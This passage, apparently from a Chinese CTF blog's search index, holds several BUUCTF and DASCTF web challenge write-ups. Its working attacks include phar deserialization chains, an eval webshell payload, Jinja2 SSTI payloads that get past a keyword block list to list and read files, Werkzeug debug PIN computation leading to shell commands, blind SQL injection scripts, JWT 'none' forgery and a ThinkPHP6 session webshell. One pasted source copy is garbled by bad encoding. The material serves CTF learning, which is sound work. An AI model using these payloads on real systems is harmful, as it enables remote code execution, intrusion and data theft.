1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;\n\n就是上面这些看起来费劲，理解不了。\n这里就直接贴 制作phar 代码。\n&lt;?phpclass User&#123;    public $db;    public function __construct()    &#123;        $this-&gt;db = new FileList();    &#125;&#125;class FileList&#123;    private $files;    private $results;    private $funcs;    public function __construct()    &#123;        $this-&gt;files = array(new File());        $this-&gt;results = array();        $this-&gt;funcs = array();    &#125;&#125;class File&#123;    public $filename = '/flag.txt';&#125;$user = new User();@unlink(\"test.phar\");$phar = new Phar(\"test.phar\");$phar-&gt;startBuffering();# 设置stub$phar-&gt;setStub(\"GIF98a&lt;?php __HALT_COMPILER(); ?&gt;\");$phar-&gt;setMetadata($user);# 添加要压缩的文件及内容$phar-&gt;addFromString('test.txt', \"test\");# 签名自动计算$phar-&gt;stopBuffering();\n\n把生成的 test.phar  改成 test.gif ，然后上传\n成功后 抓删除的包\nphar://test.gif\n\n\nphar:// 协议在读取 phar文件时，会有进行反序列化的操作，当我们把序列化的内容放在setMetadata 中，再用phar:// 协议去读取，就会反序列化里面的内容。\n在file_get_contents 函数中 用 phar:// 读取 phar文件 的演示这是仿照别人wp构造的两个类，然后用file_get_contents 来读取 自己制作的phar文件\ndemo1.php\n&lt;!-- 使用phar://进行反序列序列化-3--&gt;&lt;?phpclass Demo1&#123;    public $sub;    public function __construct($sub)    &#123;        $this-&gt;sub = $sub;    &#125;&#125;class Demo2&#123;    public $s;    public function __construct($s)    &#123;        $this-&gt;s = $s;    &#125;    public function __destruct()    &#123;        // TODO: Implement __destruct() method.        eval($this-&gt;s);    &#125;&#125;file_get_contents('phar://demo1.phar');?&gt;\n\ndemo2.php\n&lt;!-- 使用phar://进行反序列序列化-2--&gt;&lt;?phpclass Demo1&#123;    public $sub;    public function __construct()    &#123;        $this-&gt;sub = new Demo2('phpinfo();');    &#125;&#125;class Demo2&#123;    public $s;    public function __construct($s)    &#123;        $this-&gt;s = $s;    &#125;    public function __destruct()    &#123;        // TODO: Implement __destruct() method.        eval($this-&gt;s);    &#125;&#125;$user = new Demo1();@unlink(\"demo1.phar\");$phar = new Phar(\"demo1.phar\");$phar-&gt;startBuffering();# 设置stub$phar-&gt;setStub(\"GIF98a&lt;?php __HALT_COMPILER(); ?&gt;\");$phar-&gt;setMetadata($user);# 添加要压缩的文件及内容$phar-&gt;addFromString('test.txt', \"test\");# 签名自动计算$phar-&gt;stopBuffering();?&gt;\n\n执行demo1 的时候会输出\n\n","categories":["CTF","BUUCTF"],"tags":["反序列化","CTF"]},{"title":"DASCTF Oct 10月X 吉林工师 欢迎来到魔法世界～","url":"/2021/10/24/DASCTF%20Oct%2010%E6%9C%88X%20%E5%90%89%E6%9E%97%E5%B7%A5%E5%B8%88%20%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E9%AD%94%E6%B3%95%E4%B8%96%E7%95%8C%EF%BD%9E/","content":"MISCWELCOME DASCTFxJlenu 200┌──(kali㉿kali)-[~/Desktop]└─$ nc node4.buuoj.cn 27380Hello! CTFer!Welcome to Dasctf x Jlenu.Plz input your name&gt; open(\"flag.txt\").read()Wow!Hello flag&#123;32973a47-601e-4a5a-b9cb-738fb5652bf2&#125; Give your gift https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\nWeb迷路的魔法少女&lt;?phphighlight_file('index.php');extract($_GET);error_reporting(0);function String2Array($data)&#123;    if($data == '') return array();    @eval(\"\\$array = $data;\");    return $array;&#125;// 判断 $attrid 和 $attrvalue 是否都为数组if(is_array($attrid) &amp;&amp; is_array($attrvalue))&#123;    $attrstr .= 'array(';    // 拿到$attrid数组长度    $attrids = count($attrid);    // 遍历 $attrid 数组    for($i=0; $i&lt;$attrids; $i++)    &#123;        // ?attrid[0]=attrvalue1&amp;$attrvalue[0]=phpinfo();        // array(\"attrid1\"=&gt;\"attrvalue1\",\"attrid2\"=&gt;\"attrvalue2\");        // array(\"666\"=        $attrstr .= '\"'.intval($attrid[$i]).'\"=&gt;'.'\"'.$attrvalue[$i].'\"';        if($i &lt; $attrids-1)        &#123;            $attrstr .= ',';        &#125;    &#125;    $attrstr .= ');';&#125;// 调用// 假设为 array(\"attrid1\"=&gt;\"attrvalue1\",\"attrid2\"=&gt;\"attrvalue2\");// 假设为 array(\"attrid1\"=&gt;\"attrvalue1\",\"attrid2\"=&gt;\"$&#123;phpinfo();&#125;\");String2Array($attrstr);\n\npayload\n?attrid[0]=attrvalue1&amp;attrvalue[0]=$&#123;eval($_POST[&apos;cmd&apos;])&#125;;\n\n参考资料\nhttps://www.yisu.com/zixun/55478.html\n","categories":["CTF","比赛复盘"],"tags":["代码审计"]},{"title":"BUUCTF-WEB 【GYCTF2020】FlaskApp 1","url":"/2021/04/19/%5BGYCTF2020%5DFlaskApp%201/","content":"SSIT题第一种方式：绕过waf读取保存flag的文件读取app.py源代码的payload\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;\t&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;\t\t&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;app.py&apos;,&apos;r&apos;).read() &#125;&#125;\t&#123;% endif %&#125;&#123;% endfor %&#125;\n\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;app.py&apos;,&apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\nfrom flask import Flask,render_template_string from flask import render_template,request,flash,redirect,url_for from flask_wtf import FlaskForm from wtforms import StringField, SubmitField from wtforms.validators import DataRequired from flask_bootstrap import Bootstrap import base64 app = Flask(__name__) app.config[&amp;#39;SECRET_KEY&amp;#39;] = &amp;#39;s_e_c_r_e_t_k_e_y&amp;#39; bootstrap = Bootstrap(app) class NameForm(FlaskForm): text = StringField(&amp;#39;BASE64加密&amp;#39;,validators= [DataRequired()]) submit = SubmitField(&amp;#39;提交&amp;#39;) class NameForm1(FlaskForm): text = StringField(&amp;#39;BASE64解密&amp;#39;,validators= [DataRequired()]) submit = SubmitField(&amp;#39;提交&amp;#39;) def waf(str): black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] for x in black_list : if x in str.lower() : return 1 @app.route(&amp;#39;/hint&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def hint(): txt = &amp;#34;失败乃成功之母！！&amp;#34; return render_template(&amp;#34;hint.html&amp;#34;,txt = txt) @app.route(&amp;#39;/&amp;#39;,methods=[&amp;#39;POST&amp;#39;,&amp;#39;GET&amp;#39;]) def encode(): if request.values.get(&amp;#39;text&amp;#39;) : text = request.values.get(&amp;#34;text&amp;#34;) text_decode = base64.b64encode(text.encode()) tmp = &amp;#34;结果 :&#123;0&#125;&amp;#34;.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for(&amp;#39;encode&amp;#39;)) else : text = &amp;#34;&amp;#34; form = NameForm(text) return render_template(&amp;#34;index.html&amp;#34;,form = form ,method = &amp;#34;加密&amp;#34; ,img = &amp;#34;flask.png&amp;#34;) @app.route(&amp;#39;/decode&amp;#39;,methods=[&amp;#39;POST&amp;#39;,&amp;#39;GET&amp;#39;]) def decode(): if request.values.get(&amp;#39;text&amp;#39;) : text = request.values.get(&amp;#34;text&amp;#34;) text_decode = base64.b64decode(text.encode()) tmp = &amp;#34;结果 ： &#123;0&#125;&amp;#34;.format(text_decode.decode()) if waf(tmp) : flash(&amp;#34;no no no !!&amp;#34;) return redirect(url_for(&amp;#39;decode&amp;#39;)) res = render_template_string(tmp) flash( res ) return redirect(url_for(&amp;#39;decode&amp;#39;)) else : text = &amp;#34;&amp;#34; form = NameForm1(text) return render_template(&amp;#34;index.html&amp;#34;,form = form, method = &amp;#34;解密&amp;#34; , img = &amp;#34;flask1.png&amp;#34;) @app.route(&amp;#39;/&amp;lt;name&amp;gt;&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def not_found(name): return render_template(&amp;#34;404.html&amp;#34;,name = name) if __name__ == &amp;#39;__main__&amp;#39;: app.run(host=&amp;#34;0.0.0.0&amp;#34;, port=5000, debug=True)# html 解码from flask import Flask,render_template_string from flask import render_template,request,flash,redirect,url_for from flask_wtf import FlaskForm from wtforms import StringField, SubmitField from wtforms.validators import DataRequired from flask_bootstrap import Bootstrap import base64 app = Flask(__name__) app.config['SECRET_KEY'] = 's_e_c_r_e_t_k_e_y' bootstrap = Bootstrap(app) class NameForm(FlaskForm):\ttext = StringField('BASE64 Æ',validators= [DataRequired()]) \tsubmit = SubmitField('Ð¤') class NameForm1(FlaskForm):\ttext = StringField('BASE64ãÆ',validators= [DataRequired()]) \tsubmit = SubmitField('Ð¤') \tdef waf(str): \t\tblack_list = [\"flag\",\"os\",\"system\",\"popen\",\"import\",\"eval\",\"chr\",\"request\", \"subprocess\",\"commands\",\"socket\",\"hex\",\"base64\",\"*\",\"?\"] \t\tfor x in black_list : \t\t\tif x in str.lower() : \t\t\t\treturn 1 \t\t\t\t   @app.route('/hint',methods=['GET'])    \tdef hint():    \t\ttxt = \"1%C\u0010KÍ\u0001\u0001\" \t\treturn render_template(\"hint.html\",txt = txt) \t\t\t@app.route('/',methods=['POST','GET']) \tdef encode(): \t\tif request.values.get('text') :\t\t\ttext = request.values.get(\"text\") \t\t\ttext_decode = base64.b64encode(text.encode()) \t\t\ttmp = \"Ó :&#123;0&#125;\".format(str(text_decode.decode())) \t\t\tres = render_template_string(tmp) \t\t\tflash(tmp) \t\t\treturn redirect(url_for('encode'))         else :        \ttext = \"\"         \tform = NameForm(text)         \treturn render_template(\"index.html\",form = form ,method = \" Æ\" ,img = \"flask.png\") \t@app.route('/decode',methods=['POST','GET']) \tdef decode(): \t\tif request.values.get('text') : \t\t\ttext = request.values.get(\"text\") \t\t\ttext_decode = base64.b64decode(text.encode()) \t\t\ttmp = \"Ó \u001a &#123;0&#125;\".format(text_decode.decode())             if waf(tmp) :             \tflash(\"no no no !!\")                 return redirect(url_for('decode'))             res = render_template_string(tmp)             flash( res )            \treturn redirect(url_for('decode')) \t\telse : \t\t\ttext = \"\"   \t\t\tform = NameForm1(text) \t\t\treturn render_template(\"index.html\",form = form, method = \"ãÆ\" , img = \"flask1.png\") \t\t            \t\t@app.route('/&lt;name&gt;',methods=['GET']) \tdef not_found(name): \t\treturn render_template(\"404.html\",name = name) \t\tif __name__ == '__main__': \tapp.run(host=\"0.0.0.0\", port=5000, debug=True)\n\nwaf 过滤了 [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] 关键字 \n查看根目录下所有文件\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;\t&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;\t\t&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;__imp&apos;+&apos;ort__&apos;](&apos;o&apos;+&apos;s&apos;).listdir(&apos;/&apos;)&#125;&#125;\t&#123;% endif %&#125;&#123;% endfor %&#125;\n\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;__imp&apos;+&apos;ort__&apos;](&apos;o&apos;+&apos;s&apos;).listdir(&apos;/&apos;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n拼接的方式绕过waf\n[&amp;#39;bin&amp;#39;, &amp;#39;boot&amp;#39;, &amp;#39;dev&amp;#39;, &amp;#39;etc&amp;#39;, &amp;#39;home&amp;#39;, &amp;#39;lib&amp;#39;, &amp;#39;lib64&amp;#39;, &amp;#39;media&amp;#39;, &amp;#39;mnt&amp;#39;, &amp;#39;opt&amp;#39;, &amp;#39;proc&amp;#39;, &amp;#39;root&amp;#39;, &amp;#39;run&amp;#39;, &amp;#39;sbin&amp;#39;, &amp;#39;srv&amp;#39;, &amp;#39;sys&amp;#39;, &amp;#39;tmp&amp;#39;, &amp;#39;usr&amp;#39;, &amp;#39;var&amp;#39;, &amp;#39;this_is_the_flag.txt&amp;#39;, &amp;#39;.dockerenv&amp;#39;, &amp;#39;app&amp;#39;] # html解码 [&apos;bin&apos;, &apos;boot&apos;, &apos;dev&apos;, &apos;etc&apos;, &apos;home&apos;, &apos;lib&apos;, &apos;lib64&apos;, &apos;media&apos;, &apos;mnt&apos;, &apos;opt&apos;, &apos;proc&apos;, &apos;root&apos;, &apos;run&apos;, &apos;sbin&apos;, &apos;srv&apos;, &apos;sys&apos;, &apos;tmp&apos;, &apos;usr&apos;, &apos;var&apos;, &apos;this_is_the_flag.txt&apos;, &apos;.dockerenv&apos;, &apos;app&apos;]\n\n读取this_is_the_flag.txt 文件\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;\t&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;\t\t&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/this_is_the_fl&apos;+&apos;ag.txt&apos;,&apos;r&apos;).read()&#125;&#125;\t&#123;% endif %&#125;&#123;% endfor %&#125;\n\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/this_is_the_fl&apos;+&apos;ag.txt&apos;,&apos;r&apos;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n第二方式：通过计算PIN码进入shell中执行命令计算PIN码的6个数据\n1、运行app的用户名，/etc/passwd    \n​    得到 flaskweb\n2、module name 一般固定位flask.app\n3、getattr(app, &quot;__name__&quot;, app.__class__.__name__)的结果。就是Flask\n4、flask库下app.py的绝对路径，不是当前运行的app.py的路径，在debug模式下报错就能直接看见。\n/usr/local/lib/python3.7/site-packages/flask/app.py\n5、当前网络的mac地址的十进制数。通过文件 /sys/class/net/eth0/address 读取，\n02:42:ac:10:ab:40 转成10进制 2485377870656\n6、机器的id\n对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。对于docker机则读取/proc/self/cgroup，序列号为1那行\n1:name=systemd:/docker/8c9b58ed756803d15052dd5f7dc35d106e48f5dbe629ebb1d5494a9f384355af 0::/system.slice/containerd.service\n计算PIN的模板\nimport hashlibfrom itertools import chainprobably_public_bits = [    '运行app用户名',    'module name ',    'Flask',    'flask库下app.py的绝对路径',]private_bits = [    '当前网络的mac地址的十进制数',    '机器的id']h = hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode('utf-8')    h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None:    h.update(b'pinsalt')    num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')                          for x in range(0, len(num), group_size))            break    else:        rv = numprint(rv)\n\nimport hashlibfrom itertools import chainprobably_public_bits = [    'flaskweb',    'flask.app',    'Flask',    '/usr/local/lib/python3.7/site-packages/flask/app.py',]private_bits = [    '2485377870656',    '8c9b58ed756803d15052dd5f7dc35d106e48f5dbe629ebb1d5494a9f384355af']h = hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode('utf-8')    h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None:    h.update(b'pinsalt')    num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')                          for x in range(0, len(num), group_size))            break    else:        rv = numprint(rv)\n\n得到 243-909-803\n在shell 中 执行，就能拿到flag\nimport osos.popen(&quot;ls -l /&quot;).read()os.popen(&quot;cat /this_is_the_flag.txt&quot;).read()\n\n\n","categories":["CTF","BUUCTF"],"tags":["CTF","SSTI(jinja2)"]},{"title":"BUUCTF-WEB 【GYCTF2020】Ezsqli 1","url":"/2021/08/21/%5BGYCTF2020%5DEzsqli%201/","content":"考点sql盲注（无列名注入）\n前置知识过滤information_schema 代替表以下表都可代替information_schema表查询表名信息，但是不能查到列名\nmysql.innodb_table_statstable_schema table_schema 换成 database_name\n\nsys.x$schema_table_statistics（只能查表名，查不到列名）表名：table_name  数据库：table_schema\n\nsys.schema_auto_increment_columns（可获取表名和库名）表名：table_name 数据库：table_schema\n\nsys.schema_table_statistics_with_buffer（可获取表名）表名：table_name 数据库：table_schema\n\n无列名注入（只知道表名的情况下查询数据）子查询绕过\n(select `2` from (select 1,2,3 union select * from table_name)a)  //前提是要知道表名((select c from (select 1,2,3 as c union select * from users)b))    1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量\n\njoin爆破列名\n?id=-1&apos; union all select * from (select * from users as a join users as b)as c--+//as主要作用是起别名，就是把users表当做a表，常规来说as可以省略?id=-1&apos; union all select*from (select * from users as a join users as b using(id,username))as c--+\n\n逐字符检索数据\n这里的select 1 是对应字段的位置 比如 id username password 1 就对应id 2就对应 username 3就对应 password\nmysql&gt; select (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1) |+------------------------------------------------------------+| 0 |+------------------------------------------------------------+mysql&gt; select (select 1,&apos;d&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1) |+------------------------------------------------------------+| 1 |+------------------------------------------------------------+//说明第二个字段的第一位是c,以此类推\n\nmysql&gt; select (select 1,&apos;cm&apos;) &gt; (select * from users limit 0,1);+------------------------------------------------------------+| (select 1,&apos;c&apos;) &gt; (select * from users limit 0,1) |+------------------------------------------------------------+| 0 |+------------------------------------------------------------+\n\n解题过程打开页面\n页面上一个半身照，一个提交的输入框，POST提交方式，bp启动。\n检测注入类型?id=1^1^1 //回显Nu1L?id=1^0^1 //Error Occured When Fetch Result.\n\n检测出异或盲注\nFUZZ检测关键字过滤\nlength为507 是被过滤的\n挑几个关键的\ninformation handler join\n\ninformation 已经被过滤，只有通过 sys的x$schema_table_statistics 来查询表名。\n构造payload查表名payload\n1^(ascii(substr((select group_concat(table_name)from sys.x$schema_table_statistics where table_schema=database()),1,1))&gt;0)^1\n\n上脚本\nimport requestsurl='http://7a93d6a2-cc99-43d5-aaa6-aab30f35ff99.node4.buuoj.cn:81/'flag=''for i in range(1,50):    a = 32    b = 128    mid = (a+b)//2    while(a&lt;b):        data = &#123;            \"id\": \"1^(ascii(substr((select group_concat(table_name)from sys.x$schema_table_statistics where table_schema=database()),%d,1))&gt;%d)^1\"%(i, mid)        &#125;        import time        time.sleep(1)        re = requests.post(url=url,data=data)        if 'Nu1L' in re.text:            a = mid + 1            b = mid        mid = (a+b)//2    if (mid==32|mid==128):        break    flag +=chr(mid)    print(flag)\n\n跑起来\n\n得到\nusers233333333333333,f1ag_1s_h3r3_hhhhh\n\ninformation_schema关键字已经被过滤掉，想通过columns表来查询列名，几乎不可能，通过逐字符检索数据的方法来逐个猜解值，也就是无列名注入\n猜解值构造payload（两个都可以）\n1^((select (select 1,&apos;g&apos;)&gt;(select * from f1ag_1s_h3r3_hhhhh)))^1-1||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))\n\n上大佬的脚本，遇到问题还挺多，buuctf网站限制访问频率，直接跑，不一会就会报错，每次请求延时1秒。\nimport requestsurl='http://7a93d6a2-cc99-43d5-aaa6-aab30f35ff99.node4.buuoj.cn:81/'payload='-1||((select 1,\"&#123;&#125;\")&gt;(select * from f1ag_1s_h3r3_hhhhh))'flag=''for j in range(1,50):    for i in range(32,128):        hexchar=flag+chr(i)        py=payload.format(hexchar)        print(py)        datas=&#123;'id':py&#125;        import time        time.sleep(1)        re=requests.post(url=url,data=datas)        if 'Nu1L' in re.text:            flag+=chr(i-1)            print(flag)            break\n\n跑起来\n\n结果\nFLAG&#123;AE26CBD7-C851-4928-98E4-E0635D45B90C&#125;\n\npy一下转小写\n&gt;&gt;&gt; s = &quot;FLAG&#123;AE26CBD7-C851-4928-98E4-E0635D45B90C&#125;&quot;&gt;&gt;&gt; print(s.lower())flag&#123;ae26cbd7-c851-4928-98e4-e0635d45b90c&#125;\n\n总结","categories":["CTF","BUUCTF"],"tags":["CTF","SQL盲注"]},{"title":"BUUCTF-WEB 【HFCTF2020】EasyLogin 1","url":"/2021/08/21/%5BHFCTF2020%5DEasyLogin%201/","content":"考点代码审计（node.js）\nJWT伪造\n前置知识node.js\nnode.js\nkoa框架常用目录，文件\napp/controllers 项目控制器存放目录：接收请求，处理逻辑\napp/dbhelper 数据库CRUD操作的封装\napp/models 对应数据库表表结构\nconfig/router.js 项目路由\nnode_modules app.js 项目入口\n\nJWTJWT 小知识JWS：Signed JWT签名过的jwtJWE：Encrypted JWT部分payload经过加密的jwt\nJWT的组成三个部分（用点分割）header：主要声明JWT的签名算法payload：主要承载了各种声明并传递明文数据signture：拥有该部分的JWT被称为JWS，也就是签了名的JWS；没有该部分的JWT被称为nonsecure JWT，也就是不安全的JWT，此时header中声明的签名算法为none。\nJWT的形式：\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\n\nJWT的相关攻击方式\n解题过程审查元素引入一个 app.js文件\n\n找到一些关键字 koa ,koa是一个基于node.js的web框架。\n可以直接通过目录 controllers/api.js 访问到后端源代码，拷贝过来审计。\nconst crypto = require('crypto');const fs = require('fs')const jwt = require('jsonwebtoken')const APIError = require('../rest').APIError;module.exports = &#123;    # 注册功能    'POST /api/register': async (ctx, next) =&gt; &#123;        const &#123;username, password&#125; = ctx.request.body;\t\t# 这里判断 如果注册的用户名 为 admin 则不继续执行 返回 wrong username        if(!username || username === 'admin')&#123;            throw new APIError('register error', 'wrong username');        &#125;\t\t# 这里是 什么 大于 10w 重新赋值         if(global.secrets.length &gt; 100000) &#123;            global.secrets = [];        &#125;\t\t# 后边 应该是该加密 加密 该编码编码 该保存保存        const secret = crypto.randomBytes(18).toString('hex');        const secretid = global.secrets.length;        global.secrets.push(secret)        # 返回一个token 内容就是JWT         const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: 'HS256'&#125;);        ctx.rest(&#123;            token: token        &#125;);        await next();    &#125;,\t# 登录功能    'POST /api/login': async (ctx, next) =&gt; &#123;        const &#123;username, password&#125; = ctx.request.body;\t\t# 判断是否提交用户名和密码 没有则停止         if(!username || !password) &#123;            throw new APIError('login error', 'username or password is necessary');        &#125;\t\t# 下面两句不知道        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;        console.log(sid)\t\t# sid不能为 undefined sid 不能为 null sid&gt;=0&amp;&amp;sid&lt; global.secrets.length        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;            throw new APIError('login error', 'no such secret id');        &#125;        const secret = global.secrets[sid];        const user = jwt.verify(token, secret, &#123;algorithm: 'HS256'&#125;);        const status = username === user.username &amp;&amp; password === user.password;        if(status) &#123;            ctx.session.username = username;        &#125;        ctx.rest(&#123;            status        &#125;);        await next();    &#125;,       \t# 获取flag功能    'GET /api/flag': async (ctx, next) =&gt; &#123;        # 要求 session中的username 必须为 admin         if(ctx.session.username !== 'admin')&#123;            throw new APIError('permission error', 'permission denied');        &#125;        const flag = fs.readFileSync('/flag').toString();        ctx.rest(&#123;            flag        &#125;);        await next();    &#125;,    'GET /api/logout': async (ctx, next) =&gt; &#123;        ctx.session.username = null;        ctx.rest(&#123;            status: true        &#125;)        await next();    &#125;&#125;;\n\nnode.js真的一点基础都没有，不过有语言基础，还是能勉强看得懂一些，跟着大佬的wp再来审计一遍。\n解题方式需要构造一个JWT解码后明文为下面这样的JWT，将加密方式改成none，secretid改成[]，接下来需要将明文转换成JWT格式。\n&#123;  &quot;alg&quot;: &quot;none&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;&#123;  &quot;secretid&quot;: [],  &quot;username&quot;: &quot;admin&quot;,  &quot;password&quot;: &quot;123456&quot;,  &quot;iat&quot;: 1629515715&#125;\n\n解题首先注册一个账号\n\n然后登录这个账号的时候抓包\n\n后边跟了一个名为anthorization的参数，将参数值拿到 这个平台 jwt解码 查看明文。\n\n我们要做的就是将 HEADER 中的 alg加密方式改成 none，然后先将 PAYLOAD中的 secretid 改成[]，再将username改成admin，但是这里的HEADER是不能直接修改，就直接给出替换内容 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 ，然后手动将PAYLOAD中的secretid改成 []，加密后再将 SIGNATURE部分山刀，. 不删。就像下面这样。\n\n然后将这段密文替换到anthorization 参数中，最后很重要的一个地方，也很容易忘，就是将username改成admin。\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTYyOTUxODYwMn0.\n\n\n提交\n \n可见返回true\n获取flag\n\n小结这道题对node.js 和 JWT 都是一窍不通，都是硬着头皮照着大佬wp做了下来，其实之前做过jwt伪造类的题目，但是对JWT的原理并不懂，所以很快就忘掉了，这次算是巩固了一次吧，总之经验需要不断积累，原理需要深入理解。每天两道CTF题，时间就打发了。\n","categories":["CTF","BUUCTF"],"tags":["代码审计","CTF","JWT伪造"]},{"title":"BUUCTF-WEB [GYCTF2020]EasyThinking 1","url":"/2021/10/20/%5BGYCTF2020%5DEasyThinking%201/","content":"考点&amp;知识点备份文件泄露\nThinkPHP6 任意文件操作漏洞利用\n解题过程分析\n打开是这个样，有登录、注册、搜索、个人中心这几个功能，各个功能黑盒测试了一遍，均没有发现sql注入，模板注入的漏洞。不过扫目录的时候，扫出来www.zip的文件。\n从得到的报错信息中得知使用的是php的tp6框架。\n\n搜了下tp6的rce姿势。很多文章都提到了ThinkPHP6 任意文件操作漏洞。这个漏洞是在存储session时导致的文件写入，如果session可控的话就会照成任意文件操作或者任意文件删除的漏洞。\n那这个漏洞要怎么利用呢？首先要找到可以控制session的地方。\n在web\\app\\home\\controller\\Member.php\npublic function search()   &#123;       if (Request::isPost())&#123;           # 判断登录           if (!session('?UID'))           &#123;               return redirect('/home/member/login');                       &#125;           $data = input(\"post.\");           $record = session(\"Record\");           if (!session(\"Record\"))           &#123;               // 利用点               session(\"Record\",$data[\"key\"]);           &#125;           else           &#123;               $recordArr = explode(\",\",$record);               $recordLen = sizeof($recordArr);               if ($recordLen &gt;= 3)&#123;                   array_shift($recordArr);                   // 利用点                   session(\"Record\",implode(\",\",$recordArr) . \",\" . $data[\"key\"]);                   return View::fetch(\"result\",[\"res\" =&gt; \"There's nothing here\"]);               &#125;           &#125;           session(\"Record\",$record . \",\" . $data[\"key\"]);           return View::fetch(\"result\",[\"res\" =&gt; \"There's nothing here\"]);       &#125;else&#123;           return View(\"search\");       &#125;   &#125;\n\n 在Member类中找到 search方法，发现有两处可以通过外部传参设置session的值。\ngetshell接下来注册一个账号，在登录时将cookie改成00000000000000000000000000000.php 总共32位。\n\n然后再搜索框写入webshell\n\n访问 /runtime/session/sess_0000000000000000000000000000.php\n\n回显了123，说明已经写入，接下来蚁剑连接。插件绕过disable_functions，在根目录拿到flag。\n总结每一题都能学到新知识点，很不错。这道题跟着师傅们wp倒是做出来了，但是又很多原理性的知识点并没有看懂，代码审计的能力还是比较薄弱，尤其是当多个文件多个类来回看的时候，脑子就是浆糊了，现在就不深入研究了，后面来专门攻克，继续刷题。\n参考资料https://paper.seebug.org/1114/#_2\nhttps://www.cnblogs.com/h3ng/p/13758932.html\n","categories":["CTF","BUUCTF"],"tags":["代码审计","CTF","备份文件泄露","ThinkPHP6任意文件操作漏洞利用"]},{"title":"BUUCTF-WEB 【HITCON 2017】SSRFme 1","url":"/2021/08/16/%5BHITCON%202017%5DSSRFme%201/","content":"考点\nssrf\n\n代码审计\n\n\n解题过程打开36.18.121.204 &lt;?php    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123;        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];    &#125;    echo $_SERVER[\"REMOTE_ADDR\"];    $sandbox = \"sandbox/\" . md5(\"orange\" . 